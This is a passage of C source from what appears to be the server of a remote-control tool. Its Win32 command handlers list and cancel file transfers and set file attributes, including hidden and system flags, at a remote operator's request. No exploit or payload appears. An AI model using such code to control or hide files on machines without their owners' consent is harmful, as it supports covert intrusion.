	IssueAuthCommandReply(cas_from,comid,0,svMsg);

	ResumeThread(htd);
	return 0;
}



int CmdProc_ListTransfers(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	EnterCriticalSection(&g_csXfer);
	IssueAuthCommandReply(cas_from,comid,1,"Active transfers list:\n");
		
	int i;
	for(i=0;i<g_nXfers;i++) {
		char svMsg[1024];
		if(g_pXferInfo[i].nType==RECV) {
			wsprintf(svMsg,"Recv on %.256s: %.260s\n",g_pXferInfo[i].svName,g_pXferInfo[i].svPath);
		} else if(g_pXferInfo[i].nType==SEND) {
			wsprintf(svMsg,"Send to %.256s: %.260s\n",g_pXferInfo[i].svName,g_pXferInfo[i].svPath);
		} else if(g_pXferInfo[i].nType==EMIT) {
			wsprintf(svMsg,"Emit from %.256s: %.260s\n",g_pXferInfo[i].svName,g_pXferInfo[i].svPath);
		}
		IssueAuthCommandReply(cas_from,comid,1,svMsg);
	}
	IssueAuthCommandReply(cas_from,comid,1,"End of list.\n");
	LeaveCriticalSection(&g_csXfer);	
	return 0;
}

int CmdProc_CancelTransfer(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	EnterCriticalSection(&g_csXfer);
		
	// Find transfer entry from pathname
	int i;
	for(i=0;i<g_nXfers;i++) {
		if(lstrcmp(g_pXferInfo[i].svPath,svArg3)==0) {
			break;
		}
	}
	if(i==g_nXfers) {
		IssueAuthCommandReply(cas_from,comid,0,"No such transfer.\n");
		LeaveCriticalSection(&g_csXfer);	
		return -1;
	}
	// Try to cancel transfer
	HANDLE htd=g_pXferInfo[i].htd;
	g_pXferInfo[i].bActive=FALSE;
	LeaveCriticalSection(&g_csXfer);	
	
	if(WaitForSingleObject(htd,5000)!=WAIT_OBJECT_0) {
		IssueAuthCommandReply(cas_from,comid,0,"Couldn't cancel in 5 sec.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"Transfer operation canceled.\n");	
	return 0;
}

int CmdProc_SetFileAttr(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	DWORD dwAttr;
	int i,count;
	
	if(svArg3==NULL || svArg2==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not change attributes. Invalid parameters.\n");	
		return -1;
	}

	dwAttr=0;
	count=lstrlen(svArg3);
	for(i=0;i<count;i++) {
		if(svArg3[i]=='A' || svArg3[i]=='a') dwAttr|=FILE_ATTRIBUTE_ARCHIVE;
		if(svArg3[i]=='H' || svArg3[i]=='h') dwAttr|=FILE_ATTRIBUTE_HIDDEN;
		if(svArg3[i]=='S' || svArg3[i]=='s') dwAttr|=FILE_ATTRIBUTE_SYSTEM;
		if(svArg3[i]=='R' || svArg3[i]=='r') dwAttr|=FILE_ATTRIBUTE_READONLY;
		if(svArg3[i]=='T' || svArg3[i]=='t') dwAttr|=FILE_ATTRIBUTE_TEMPORARY;	
	}
	if(SetFileAttributes(svArg2,dwAttr)==0) {
		IssueAuthCommandReply(cas_from,comid,0,"Could not change attributes.\n");
		return -1;
	}

	IssueAuthCommandReply(cas_from,comid,0,"Attributes changed.\n");
	return 0;
}
